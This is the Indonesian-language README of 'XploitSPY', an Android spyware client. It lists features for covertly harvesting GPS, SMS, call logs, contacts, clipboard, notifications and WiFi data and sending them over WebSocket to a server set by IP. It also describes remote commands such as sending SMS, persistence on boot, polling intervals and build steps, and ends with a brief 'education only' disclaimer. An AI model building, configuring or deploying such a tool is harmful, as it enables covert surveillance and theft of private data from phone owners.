# XploitSPY Android Client

Android client untuk XploitSPY yang mengumpulkan dan mengirim data ke server.

## Fitur

- ✅ GPS Logging
- ✅ Microphone Recording (perlu implementasi tambahan)
- ✅ View Contacts
- ✅ SMS Logs
- ✅ Send SMS (via command)
- ✅ Call Logs
- ✅ View Installed Apps
- ✅ Live Clipboard Logging
- ✅ Live Notification Logging (perlu NotificationListenerService)
- ✅ View WiFi Networks
- ✅ File Explorer & Downloader (perlu implementasi tambahan)
- ✅ Command Queuing
- ✅ Device Admin (perlu implementasi tambahan)
- ✅ Auto-start on boot

## Struktur Kode

```
client/
├── app/
│   └── src/
│       └── main/
│           ├── java/com/xploitspy/client/
│           │   ├── MainActivity.java          # Entry point
│           │   ├── Config.java                # Konfigurasi server
│           │   ├── service/
│           │   │   └── SpyService.java       # Background service
│           │   ├── manager/
│           │   │   ├── SocketManager.java    # WebSocket connection
│           │   │   └── DataManager.java      # Data collection manager
│           │   ├── collector/
│           │   │   ├── GpsCollector.java
│           │   │   ├── SmsCollector.java
│           │   │   ├── CallCollector.java
│           │   │   ├── ContactCollector.java
│           │   │   ├── AppCollector.java
│           │   │   ├── ClipboardCollector.java
│           │   │   ├── WifiCollector.java
│           │   │   └── NotificationCollector.java
│           │   └── receiver/
│           │       └── BootReceiver.java     # Auto-start on boot
│           └── AndroidManifest.xml
└── build.gradle
```

## Build APK

### Prerequisites

- Android Studio atau Android SDK
- Java 11+
- Gradle

### Menggunakan APK Builder

```bash
cd builder/
./build.sh
# Masukkan IP server
cd ../client/
./gradlew assembleRelease
```

### Manual Build

1. Edit `app/src/main/java/com/xploitspy/client/Config.java`:
   ```java
   public static final String SERVER_URL = "http://YOUR_SERVER_IP:80";
   public static final String SOCKET_URL = "http://YOUR_SERVER_IP:80";
   ```

2. Build dengan Gradle:
   ```bash
   ./gradlew assembleRelease
   ```

3. APK akan tersedia di: `app/build/outputs/apk/release/`

## Permissions

Aplikasi memerlukan permissions berikut:

- `INTERNET` - Koneksi ke server
- `ACCESS_FINE_LOCATION` - GPS tracking
- `ACCESS_COARSE_LOCATION` - Network location
- `RECORD_AUDIO` - Microphone recording
- `READ_CONTACTS` - Read contacts
- `READ_SMS` - Read SMS
- `SEND_SMS` - Send SMS
- `READ_CALL_LOG` - Read call logs
- `READ_PHONE_STATE` - Phone state
- `QUERY_ALL_PACKAGES` - List installed apps
- `ACCESS_WIFI_STATE` - WiFi networks
- `READ_EXTERNAL_STORAGE` - File access
- `WRITE_EXTERNAL_STORAGE` - File access

## Cara Kerja

1. **MainActivity**: Meminta permissions dan memulai service
2. **SpyService**: Service background yang berjalan terus
3. **SocketManager**: Mengelola koneksi WebSocket ke server
4. **DataManager**: Mengatur pengumpulan data dengan interval tertentu
5. **Collectors**: Mengumpulkan data dari berbagai sumber
6. **BootReceiver**: Memulai service saat device boot

## Data Collection Intervals

- GPS: Setiap 30 detik
- SMS: Setiap 60 detik
- Calls: Setiap 60 detik
- Contacts: Setiap 5 menit
- Apps: Setiap 10 menit
- Clipboard: Setiap 10 detik
- WiFi: Setiap 5 menit

## Command Handling

Client menerima commands dari server melalui WebSocket:

- `start_gps` - Start GPS logging
- `stop_gps` - Stop GPS logging
- `start_mic` - Start microphone recording
- `stop_mic` - Stop microphone recording
- `get_contacts` - Get contacts
- `get_apps` - Get installed apps
- `get_wifi` - Get WiFi networks
- `get_clipboard` - Get clipboard
- `send_sms` - Send SMS (dengan parameters)

## Catatan Implementasi

### Notification Logging

Untuk notification logging, perlu implementasi `NotificationListenerService`:

1. Buat class yang extends `NotificationListenerService`
2. Register di AndroidManifest.xml
3. User harus mengaktifkan secara manual di Settings > Accessibility

### Microphone Recording

Perlu implementasi MediaRecorder untuk recording audio.

### File Explorer

Perlu implementasi file browser dan downloader.

### Device Admin

Perlu implementasi DeviceAdminReceiver untuk device admin features.

## Troubleshooting

### Client tidak connect ke server
- Pastikan IP server benar di Config.java
- Pastikan device dan server dalam jaringan yang sama
- Cek firewall server
- Pastikan server sedang running

### Data tidak terkirim
- Cek permissions sudah diberikan semua
- Cek koneksi internet device
- Lihat log: `adb logcat | grep XploitSPY`

### Service tidak start
- Pastikan permissions sudah diberikan
- Cek AndroidManifest.xml
- Restart device

## Disclaimer

⚠️ **PENTING**: 
- Aplikasi ini hanya untuk tujuan edukasi dan pengujian keamanan
- Penggunaan yang tidak sah adalah ilegal
- Selalu dapatkan persetujuan sebelum monitoring perangkat
